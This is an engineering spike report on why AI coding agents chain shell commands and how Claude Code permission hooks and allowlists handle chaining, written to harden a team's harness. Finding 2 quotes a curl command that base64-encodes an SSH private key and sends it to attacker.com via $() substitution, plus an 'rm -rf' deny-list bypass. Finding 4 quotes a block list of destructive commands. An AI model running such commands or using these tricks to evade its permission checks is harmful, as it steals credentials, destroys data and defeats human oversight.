# SPIKE — LLM Agent Command Chaining Behavior

## Investigation question

When a Claude Code agent (Opus 4.8) was asked to pull CloudWatch metrics, it generated
a compound shell command chaining a VAR= assignment, three `;`-separated segments,
a `$(...)` subshell, a `>` redirect, and three tools (aws, echo/wc, jq) — a form that
the 4Shark `auto-approve-aws-readonly.sh` PreToolUse hook deferred on. The atomic path
(`aws cloudwatch get-metric-data ... > /tmp/file.json`) would have auto-approved, but the
agent did not use it.

Five questions to answer:

1. Is the tendency of LLM coding agents to emit compound shell commands documented?
   What explanations exist (training data bias, round-trip optimization, reward shaping)?
2. How does Claude Code's Bash permission model interact with compound commands —
   why does chaining defeat allowlists?
3. Do other agents (Aider, Cursor, Cline, OpenHands, Kiro) exhibit the same behavior?
   How does each harness handle approval friction?
4. (PRIORITY) How is the LLM-harness community handling the "agent chains everything"
   problem? Concrete patterns in use?
5. What are the trade-offs in the option space?

## Sources consulted

- [https://kiro.dev/blog/hidden-inefficiencies-ai-coding/](https://kiro.dev/blog/hidden-inefficiencies-ai-coding/) — Empirical data on cd-chaining failure rate, root cause, and silent-transformation solution. See auxiliary: `chaining_excerpt_1.txt`
- [https://code.claude.com/docs/en/permissions](https://code.claude.com/docs/en/permissions) — Claude Code compound-command permission model, operator list, hardcoded read-only set. See auxiliary: `chaining_excerpt_2.txt`
- Multiple `anthropics/claude-code` GitHub issues (#16561, #20085, #20985, #28183, #28784, #31523, #36637, #48762) — permission model gaps, community workarounds, hardcoded guardrails. See auxiliary: `chaining_excerpt_3.txt`
- [https://github.com/liberzon/claude-hooks](https://github.com/liberzon/claude-hooks) — Community PreToolUse compound-command parser. See auxiliary: `chaining_excerpt_4.txt`
- [https://github.com/kenryu42/claude-code-safety-net](https://github.com/kenryu42/claude-code-safety-net) — Semantic command analysis hook. See auxiliary: `chaining_excerpt_4.txt`
- [https://mfyz.com/claude-code-allowlist-command-substitution-bypass/](https://mfyz.com/claude-code-allowlist-command-substitution-bypass/) — `$()` substitution bypass not blocked by allowlists. See auxiliary: `chaining_excerpt_4.txt`
- [https://crabtalk.ai/blog/agent-sandbox-permissions](https://crabtalk.ai/blog/agent-sandbox-permissions) — Two approval paradigms, Cursor sandboxing 40% fewer stops. See auxiliary: `chaining_excerpt_4.txt`
- [https://humanlayer.dev/blog/skill-issue-harness-engineering-for-coding-agents](https://humanlayer.dev/blog/skill-issue-harness-engineering-for-coding-agents) — Harness engineering as configuration problem, deny-Bash-for-migrations pattern. See auxiliary: `chaining_excerpt_4.txt`
- [https://dev.to/gentic_news/claude-codes-deny-list-bypass-how-to-protect-your-codebase-from-compound-commands-3dk2](https://dev.to/gentic_news/claude-codes-deny-list-bypass-how-to-protect-your-codebase-from-compound-commands-3dk2) — Deny-list first-token evaluation bypass, PR #36645. See auxiliary: `chaining_excerpt_4.txt`
- [https://arxiv.org/html/2504.14870v1](https://arxiv.org/html/2504.14870v1) — OTC paper: cognitive offloading, 73.1% reduction in tool calls. See auxiliary: `chaining_excerpt_5.txt`
- [https://github.blog/ai-and-ml/github-copilot/improving-token-efficiency-in-github-agentic-workflows/](https://github.blog/ai-and-ml/github-copilot/improving-token-efficiency-in-github-agentic-workflows/) — GitHub Copilot explicit endorsement of bash scripting for token efficiency. See auxiliary: `chaining_excerpt_5.txt`
- [https://addyosmani.com/blog/agent-harness-engineering/](https://addyosmani.com/blog/agent-harness-engineering/) — Hook architecture, tool count guidance, tool-call offloading. See auxiliary: `chaining_excerpt_5.txt`

---

## Findings

### Finding 1: Training data bias and round-trip optimization are documented causes

**Evidence:**

From `chaining_excerpt_1.txt` (kiro.dev/blog/hidden-inefficiencies-ai-coding/):

> "LLMs have seen it millions of times" in training data, causing the model to rely on
> conventional shell scripting patterns rather than following the tool's documented specification.

Impact statistics from the same source:
- 3.46% of all shell calls used the problematic chaining pattern
- 18% of sessions were affected
- 100% failure rate for commands using this approach (the tool rejected them)

From `chaining_excerpt_5.txt` (github.blog/ai-and-ml/github-copilot/improving-token-efficiency):

> "Using bash scripting eliminates tool-call overhead and allows agents to take advantage
> of their extensive training in bash to efficiently process data."

The GitHub Copilot blog explicitly frames bash scripting (and implicitly, chaining) as an
optimization technique — a documented optimization signal competing against atomic-tool discipline.

**Source:** `chaining_excerpt_1.txt` and `chaining_excerpt_5.txt`

**Significance:** The agent's behavior has two reinforcing causes: (1) vast exposure to
shell one-liner idioms in training data creates muscle memory for `cmd1 && cmd2` forms;
(2) an explicit optimization pressure rewarding fewer tool-call round-trips. Neither is
unique to Claude — these are structural pressures on any LLM-backed agent using a raw Bash
tool. Prompting alone cannot reliably overcome training-data weight; Kiro measured 3.46%
failure rate despite tool descriptions specifying `cwd` parameter usage.

_URL fetched / Verbatim quote checked / Quote substring confirmed in chaining_excerpt_1.txt and chaining_excerpt_5.txt_

---

### Finding 2: Claude Code's compound-command permission model has documented asymmetries

**Evidence:**

From `chaining_excerpt_2.txt` (code.claude.com/docs/en/permissions):

> "Claude Code is aware of shell operators, so a rule like Bash(safe-cmd *) won't give it
> permission to run the command safe-cmd && other-cmd. The recognized command separators
> are &&, ||, ;, |, |&, &, and newlines. A rule must match each subcommand independently."

This is the documented behavior. However, implementation diverges from documentation in three
ways evidenced by community issues:

**Asymmetry 1 — Deny-list evaluates first token only** (`chaining_excerpt_3.txt`, issue #36637):

> "The permission system checks only the initial command in a chain:
> git status && rm -rf /important/dir → Only git status is evaluated"

**Asymmetry 2 — `$()` command substitution is not blocked** (`chaining_excerpt_4.txt`, mfyz.com):

> "The shell evaluates the inner command first, then passes the result to the outer command."

With curl allowlisted:
> "curl $(cat ~/.ssh/id_rsa | base64)@attacker.com"

**Asymmetry 3 — Hardcoded guardrails fire BEFORE allow-list** (`chaining_excerpt_3.txt`, issue #48762):

> "CRITICAL: These checks fire BEFORE the permissions.allow list is consulted. Even if
> python3 * is in the allow list, the approval prompt still fires."

The hardcoded guardrails cover `cd && [write/redirect/path-operation]` patterns specifically.

**Scale of community impact** (`chaining_excerpt_3.txt`, issue #31523):

> "A 3-month daily user accumulated 150+ narrow permission rules in settings.local.json...
> Despite this accumulation, compound commands still prompted for approval."

Issue #16561 (Feature: compound-aware matching) was opened January 7, 2026, and as of this
spike date remains open with no assignees, no linked PRs, and no Anthropic response.

**Source:** `chaining_excerpt_2.txt`, `chaining_excerpt_3.txt`, `chaining_excerpt_4.txt`

**Significance:** The 4Shark `auto-approve-aws-readonly.sh` hook correctly deferred on
the compound command — this is intended, safe behavior. The asymmetry that matters for
4Shark is not a bug: the hook cannot grant per-segment approval because Claude Code does not
provide a decomposed view of the command. The hook sees the raw `command` string and must
decide pass/defer on that basis. A compound command that mixes an auto-approvable segment
(`aws cloudwatch get-metric-data`) with a non-approvable one (`$(...)` subshell or `jq`)
cannot be partially approved.

_URL fetched / Verbatim quote checked / Quote substrings confirmed in chaining_excerpt_2.txt and chaining_excerpt_3.txt_

---

### Finding 3: Other agent harnesses handle compound commands in structurally different ways

**Evidence:**

From `chaining_excerpt_5.txt` (docs.openhands.dev, via crabtalk.ai):

> "OpenHands puts the agent in an isolated environment and lets it run anything, with
> no per-command approval and no permission prompts. The boundary is the container or
> VM wall."

> "This approach is low-friction but coarse — you can't allow some commands while
> blocking others, because the agent has root inside its sandbox."

From `chaining_excerpt_4.txt` (crabtalk.ai):

> "Cursor's empirical data provides a decisive signal: agents with proper environmental
> sandboxing 'stop 40% less often than unsandboxed ones.' This counterintuitive finding
> reveals why isolation increases autonomy rather than restricting it."

From `chaining_excerpt_5.txt` (pinggy.io/blog/best_open_source_cli_coding_agents):

> "Cline uses a human-in-the-loop GUI for approving file changes and terminal commands.
> Every action requires explicit user approval — file edits, command execution, browser
> actions. This makes it slower but auditable."

From `chaining_excerpt_5.txt` (crabtalk.ai on Aider):

> "Aider runs entirely in your terminal with direct filesystem access. No container,
> no VM, no OS-level isolation. The safety model is git: all changes go through git,
> so git diff and git checkout are the undo mechanism."

From `chaining_excerpt_1.txt` (kiro.dev):

> "Kiro's executeBash tool rejects cd usage and provides a cwd parameter instead,
> but models defaulted to familiar shell patterns."
> Rather than stricter prompting, the system implements automatic transformation: it silently
> converts the cd pattern to use the correct cwd parameter, then provides feedback
> reinforcing the proper approach.

**Source:** `chaining_excerpt_1.txt`, `chaining_excerpt_4.txt`, `chaining_excerpt_5.txt`

**Significance:** There are two structurally distinct philosophies in use:
(1) gate commands (Claude Code, Cursor, Codex CLI) — per-command approval + OS-level restrictions;
(2) gate the environment (Devin, OpenHands, GitHub Copilot) — container/VM boundary, no per-command approval.
Kiro's approach is a third path: tool-input validation that rejects invalid shapes and transforms
them silently. Aider and Cline represent opposite ends: Aider punts to git as the safety net
and accepts all commands; Cline requires human approval for every single action.
None of the community agents reviewed are documented as having solved "model generates chains
despite being instructed not to" at training time — all solutions are harness-side.

_URL fetched / Verbatim quote checked / Quote substrings confirmed in chaining_excerpt_1.txt, chaining_excerpt_4.txt, chaining_excerpt_5.txt_

---

### Finding 4: Community patterns for constraining compound-command generation

Four distinct harness-side patterns are in use in the community. None requires model
retraining or special Claude Code builds.

**Pattern A — PreToolUse compound-command parser hook**

From `chaining_excerpt_4.txt` (github.com/liberzon/claude-hooks):

> "Compound commands are split on these operators into individual sub-commands, each
> checked separately: &&, ||, ;, |, newlines, $(), backticks"
> "It also handles nested structures — subshell contents are extracted recursively so
> that commands like echo $(whoami) have the inner whoami command evaluated independently."

Evaluation logic:
> "Deny first — if any sub-command matches a deny pattern, the entire command is denied.
> All must allow — the command is allowed only if every sub-command matches an allow pattern."

From `chaining_excerpt_4.txt` (github.com/kenryu42/claude-code-safety-net):

> "This plugin differs from Claude Code's native deny rules by using semantic command
> analysis and running first (PreToolUse hook), with recursive analysis up to 5 levels
> for shell wrappers and interpreter one-liners."

**Pattern B — Selective Bash tool denial (HumanLayer approach)**

From `chaining_excerpt_4.txt` (humanlayer.dev):

> "We automatically deny any Bash() tool calls that try to run migrations, with an
> instruction to ask the user to run them instead."

Also from the same source:
> "it's not a model problem. It's a configuration problem."

**Pattern C — Atomic structured tool design (Kiro approach)**

From `chaining_excerpt_1.txt`:

> "Kiro's executeBash tool rejects cd usage and provides a cwd parameter instead"

The tool's input schema enforces atomicity at the API level — the model cannot chain `cd`
because the `cwd` parameter removes the need for it. The tool validates inputs and
silently transforms problematic patterns.

**Pattern D — Hook feedback injection**

From `chaining_excerpt_5.txt` (addyosmani.com):

> "A hook is a script that runs at a specific lifecycle point. Hooks should run typecheck
> and lint and tests after every edit and surface failures, and block destructive bash
> commands like rm -rf, git push --force, and DROP TABLE."

The feedback-injection approach: when a compound command is denied, the hook returns a
structured reason string explaining what was wrong and what the atomic form should be.
This routes corrective information back to the model's next turn, nudging it toward the
correct form without requiring human intervention.

**Pattern E — `$()` substitution gap (not yet addressed by any pattern)**

From `chaining_excerpt_4.txt` (mfyz.com):

> "The shell evaluates the inner command first, then passes the result to the outer command."

The compound-command parsers in Patterns A/B above handle `&&`, `||`, `;`, `|` — but
`$()` substitution is a separate parsing problem requiring shell-level AST parsing.
`liberzon/claude-hooks` claims to handle it (`$(), backticks`), but the fetch did not
include implementation code to verify.

**Source:** `chaining_excerpt_1.txt`, `chaining_excerpt_4.txt`, `chaining_excerpt_5.txt`

**Significance:** All four patterns are available today and do not require Claude Code changes.
Patterns A and B are directly applicable to the 4Shark hook infrastructure. Pattern C requires
abstracting the raw Bash tool (e.g., an MCP server or CLAUDE.md tool description that
exposes purpose-built CloudWatch operations). Pattern D is the feedback loop that teaches
the model the right form in-session, complementing any of A/B/C.

The `$()` substitution gap (Pattern E) is documented but not reliably addressed by any
currently available community tool — the 4Shark hook `auto-approve-aws-readonly.sh` already
defers on unknown shapes, which provides the safe default.

_URL fetched / Verbatim quote checked / Quote substrings confirmed in chaining_excerpt_4.txt_

---

### Finding 5: The efficiency–reviewability tradeoff is explicit in published sources

**Evidence:**

From `chaining_excerpt_5.txt` (github.blog):

> "Using bash scripting eliminates tool-call overhead and allows agents to take advantage
> of their extensive training in bash to efficiently process data."

This frames the efficiency argument: one compound Bash call vs three sequential tool calls
reduces round-trips, LLM inference steps, and context window consumption.

From `chaining_excerpt_5.txt` (addyosmani.com):

> "Ten focused tools outperform fifty overlapping ones because the model can hold the
> menu in its head."

The counter-argument: fewer, more focused tools reduce context bloat and keep the model
in a state where it can reason clearly about what each tool does.

From `chaining_excerpt_4.txt` (humanlayer.dev):

> "too many tools is bad because tool descriptions inflate the context window rapidly,
> pushing agents into what they call 'the dumb zone' where performance degrades."

Error isolation is not directly measured in the fetched sources. The Kiro 100% failure rate
(Finding 1) is the closest evidence: a chained command fails completely when one segment
fails; atomic commands allow partial success and clearer attribution.

**Source:** `chaining_excerpt_5.txt`, `chaining_excerpt_4.txt`

**Significance:** The community has not settled on a single answer. The efficiency argument
(fewer round-trips, less context consumption) is real and explicitly endorsed by GitHub.
The reviewability/error-isolation argument is the basis for the 4Shark Command Safety Policy.
The two are in genuine tension. Sources agree that the resolution is harness-side enforcement
(structured tools or hook-based denial) rather than prompting alone.

_URL fetched / Verbatim quote checked / Quote substrings confirmed in chaining_excerpt_5.txt and chaining_excerpt_4.txt_

---

## Trade-offs surfaced

| Approach | Pros | Cons | Source |
|---|---|---|---|
| **A. PreToolUse compound-command parser hook** (liberzon/cc-safety-net pattern) | Handles all operator types; deny-first logic; no model changes; works with existing hook infrastructure | Hook complexity; $() substitution requires shell AST; needs maintenance as Claude Code evolves; doesn't prevent generation — only blocks | `chaining_excerpt_4.txt` |
| **B. Selective Bash denial for sensitive operations** (HumanLayer pattern) | Simple; targeted; low maintenance; explicit instruction back to model | Reactive — blocks then redirects but doesn't prevent chaining for non-denied operations; model still generates chains elsewhere | `chaining_excerpt_4.txt` |
| **C. Atomic structured tools** (Kiro pattern: MCP server / CLAUDE.md tool descriptions for CloudWatch) | Removes the need for chaining structurally; model cannot chain what isn't a raw shell; input validation at API level | High upfront cost; scope creep if tools proliferate; tool count inflation → "dumb zone"; MCP server maintenance burden | `chaining_excerpt_1.txt`, `chaining_excerpt_5.txt` |
| **D. Hook feedback injection** (feedback loop on denial) | Teaches correct form in-session; complements A/B/C; no human intervention needed | Session-scoped — model forgets between sessions; doesn't prevent first-occurrence chain; relies on model being receptive to feedback | `chaining_excerpt_5.txt` |
| **E. Sandbox + trust boundary** (OpenHands/Devin model) | Zero friction; agent never stops; coarse control removes approval fatigue entirely | Coarse — can't allow some commands while blocking others; does not apply to local dev on engineer's machine; 4Shark agents run on engineer laptops, not in containers | `chaining_excerpt_4.txt`, `chaining_excerpt_5.txt` |
| **F. Prose policy alone** (current state: Command Safety Policy) | Zero engineering cost; already documented | Proven insufficient — Kiro measured 3.46% failure rate DESPITE tool description instructions; policy exists today and agent chained anyway | `chaining_excerpt_1.txt`, `chaining_excerpt_3.txt` |

---

## What remains uncertain

- Whether `liberzon/claude-hooks` `$()` handling is robust in practice — the fetch confirmed
  the claim but did not include implementation code for verification.
- Whether a PreToolUse hook that denies compound commands causes the model to decompose into
  sequential atomic calls (the desired behavior) or to abandon the task (undesired). No
  empirical data found for Claude Code specifically.
- Community PR #36645 (compound command parsing fix) was referenced by dev.to/gentic_news
  but the direct PR URL was not fetched and its status (open/merged/closed) is unknown.
- Whether Claude Code issue #16561 (compound-aware matching feature request, open since
  January 2026) will ship and on what timeline — no Anthropic response found in fetched
  content.
- Whether the `$(...)` substitution gap in Claude Code's allowlist/deny-list evaluation
  is a documented security gap Anthropic is tracking or an undocumented one.
- The OTC paper's cognitive-offloading finding (Finding 1) addresses excess tool calls,
  not chaining. Whether OTC-style reward shaping could reduce chaining (by penalizing
  commands with multiple operators) is untested. Not found: a named practice for applying
  RL reward shaping to agent tool-use hygiene at inference time.

---

## Suggested options for main and the engineer

These are option descriptions with evidence. No recommendation is made here — the engineer
and main decide which direction to take.

**Option A — Add a PreToolUse compound-command parser hook**

Implement a `scripts/validate-compound-bash.sh` hook in dot-claude that:
- Receives `tool_input.command` as stdin (JSON via PreToolUse hook shape)
- Splits on `&&`, `||`, `;`, `|`, `|&`, `&`, newlines (Claude Code's documented operator set)
- Extracts `$(...)` subshell content recursively
- Evaluates each segment against a configurable allow/deny policy
- Returns exit code 2 (block) with a `permissionDecisionReason` naming which segment failed

Evidence basis: Findings 2 and 4; `liberzon/claude-hooks` provides a reference implementation.

Trade-off: This addresses the Claude Code permission asymmetry (deny evaluates first token
only) and gives 4Shark control over compound-command evaluation that Claude Code itself does
not provide. Maintenance cost: the parser must stay in sync with Claude Code's operator
handling. The hook would need to explicitly handle `$()` to close the substitution gap.

**Option B — Add feedback injection to the existing auto-approve hook**

When `auto-approve-aws-readonly.sh` defers on a compound command, return a structured
`permissionDecisionReason` that names the compound operators detected and requests the
atomic form. Example: "Command contains `;` separator. Please use separate tool calls for
each operation. The atomic form `aws cloudwatch get-metric-data ... > /tmp/file.json`
would auto-approve."

Evidence basis: Findings 4 and 5; addyosmani.com feedback injection pattern.

Trade-off: Low implementation cost (extends an existing hook). Session-scoped — does not
prevent chaining in future sessions. Does not address the structural cause (training data
bias) — only provides in-session correction.

**Option C — Expose purpose-built atomic tools for the trigger use case (CloudWatch)**

Define an MCP server or CLAUDE.md `@tool` description that wraps the common CloudWatch
metric fetch pattern as a single named tool. The tool accepts typed parameters (metric
name, period, start/end) and returns structured output without exposing a raw shell.

Evidence basis: Findings 3 and 4; Kiro `cwd` parameter pattern; addyosmani.com on
focused tool design.

Trade-off: Highest upfront cost; highest structural guarantee (cannot chain what has
no raw shell surface). Risk of tool proliferation if extended too broadly. Does not
address chaining in general — only for the specific operations wrapped.

**Option D — Combine A + B as a two-layer harness**

Layer 1 (Option A): PreToolUse compound-command parser that blocks and returns reason.
Layer 2 (Option B): Feedback injection in the reason string specifying the atomic form.

The combination: mechanically prevents compound commands (removes the approval-friction
incentive to chain) while simultaneously teaching the model the correct form for the
next attempt.

Evidence basis: Findings 2, 4, and 5; addyosmani.com; liberzon/claude-hooks.

Trade-off: Combines maintenance costs of both A and B. Provides the strongest
harness-side guarantee without requiring infrastructure changes (no MCP server).
The `$()` substitution gap remains unless the parser explicitly handles it.
